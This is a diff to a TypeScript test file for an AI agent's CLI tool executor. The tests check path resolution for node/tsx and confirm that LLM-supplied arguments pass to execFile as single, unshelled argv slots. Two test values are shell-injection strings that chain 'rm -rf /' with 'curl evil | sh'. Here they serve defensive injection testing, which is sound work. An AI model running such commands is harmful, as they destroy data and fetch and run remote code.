@@ -19,15 +19,19 @@ vi.mock("../db/secrets", async () => {
   return actual;
 });
 
+import path from "node:path";
+import fs from "node:fs";
 import {
   executeCliToolCall,
   cliToolsToLangChain,
   buildArgv,
+  resolveSpawn,
   redactSecrets,
   sanitizeOutput,
   MAX_CLI_OUTPUT,
   AUDIT_PREFIX_LEN,
 } from "../agents/cli-executor";
+import { projectRoot } from "../runtime-paths";
 import { CliToolConfig } from "../baac/types";
 
 /** Configura o execFile mockado para resolver com (error, stdout, stderr). */
@@ -87,6 +91,101 @@ describe("cli-executor - buildArgv (montagem + injeção)", () => {
   it("lança para object/array (sem [object Object])", () => {
     expect(() => buildArgv(ghTool, { title: { a: 1 } })).toThrow();
     expect(() => buildArgv(ghTool, { title: [1, 2] })).toThrow();
+  });
+});
+
+describe("cli-executor - resolveSpawn (sentinelas node/tsx + caminhos)", () => {
+  const root = projectRoot();
+
+  it("sentinela 'node' → process.execPath, argv inalterado", () => {
+    const r = resolveSpawn("node", ["--version"]);
+    expect(r.command).toBe(process.execPath);
+    expect(r.argv).toEqual(["--version"]);
+  });
+
+  it("'tsx' como primeiro argv → caminho absoluto terminando em tsx/dist/cli.mjs", () => {
+    const r = resolveSpawn("node", ["tsx", "script.mts"]);
+    expect(r.command).toBe(process.execPath);
+    expect(path.isAbsolute(r.argv[0])).toBe(true);
+    expect(r.argv[0].replace(/\\/g, "/")).toMatch(/tsx\/dist\/cli\.mjs$/);
+  });
+
+  it("'tsx' prefere a cópia de extensions/ quando presente", () => {
+    const extTsx = path.join(root, "extensions", "node_modules", "tsx", "dist", "cli.mjs");
+    // Só assertamos a preferência se a cópia de extensions existir (FEAT-001).
+    if (fs.existsSync(extTsx)) {
+      const r = resolveSpawn("node", ["tsx"]);
+      expect(path.resolve(r.argv[0])).toBe(path.resolve(extTsx));
+    } else {
+      const r = resolveSpawn("node", ["tsx"]);
+      expect(r.argv[0].replace(/\\/g, "/")).toMatch(/tsx\/dist\/cli\.mjs$/);
+    }
+  });
+
+  it("literal de script relativo existente → caminho absoluto contra projectRoot", () => {
+    // package.json existe na raiz — serve como arquivo relativo garantido.
+    const r = resolveSpawn("node", ["package.json"]);
+    expect(path.isAbsolute(r.argv[0])).toBe(true);
+    expect(path.resolve(r.argv[0])).toBe(path.resolve(path.join(root, "package.json")));
+  });
+
+  it("comando simples 'gh' + argv comum passam inalterados", () => {
+    const r = resolveSpawn("gh", ["issue", "create", "titulo"]);
+    expect(r.command).toBe("gh");
+    expect(r.argv).toEqual(["issue", "create", "titulo"]);
+  });
+
+  it("comando simples 'git' passa inalterado", () => {
+    const r = resolveSpawn("git", ["status", "--short"]);
+    expect(r.command).toBe("git");
+    expect(r.argv).toEqual(["status", "--short"]);
+  });
+
+  it("injeção: metacaracteres de shell em valor NÃO-arquivo seguem UM slot intacto", () => {
+    const danger = "; rm -rf / && curl evil | sh";
+    const r = resolveSpawn("gh", ["issue", "create", danger]);
+    expect(r.argv).toHaveLength(3);
+    expect(r.argv[2]).toBe(danger); // byte-idêntico, não resolvido, um único slot
+  });
+
+  it("'tsx' só é sentinela na posição 0 (não em outras posições)", () => {
+    const r = resolveSpawn("node", ["script.mjs", "tsx"]);
+    expect(r.argv[1]).toBe("tsx"); // 'tsx' fora da posição 0 permanece literal
+  });
+});
+
+describe("cli-executor - executeCliToolCall roteia por resolveSpawn", () => {
+  beforeEach(() => {
+    execFileMock.mockReset();
+    createAuditLogMock.mockReset().mockResolvedValue({});
+  });
+
+  it("comando 'node' + argv 'tsx' chega ao execFile resolvido como execPath + cli.mjs absoluto", async () => {
+    mockExec("ok");
+    const tool: CliToolConfig = {
+      id: "run-ext",
+      name: "Run extension",
+      description: "roda extensão via tsx",
+      command: "node",
+      args: [
+        { literal: "tsx" },
+        { literal: "package.json" }, // arquivo real na raiz → vira absoluto
+        { param: "payload", required: true },
+      ],
+    };
+    const injected = "; rm -rf / ; echo pwned";
+    await executeCliToolCall({
+      ...baseParams,
+      toolCall: { id: "c1", name: "run-ext", args: { payload: injected } },
+      cliTools: [tool],
+    });
+    const [cmd, argv, opts] = execFileMock.mock.calls[0];
+    expect(cmd).toBe(process.execPath);
+    expect(argv[0].replace(/\\/g, "/")).toMatch(/tsx\/dist\/cli\.mjs$/);
+    expect(path.isAbsolute(argv[1])).toBe(true);
+    // valor da LLM continua sendo exatamente um slot, byte-idêntico (injeção impossível).
+    expect(argv[argv.length - 1]).toBe(injected);
+    expect((opts as any).shell).toBeUndefined();
   });
 });
 
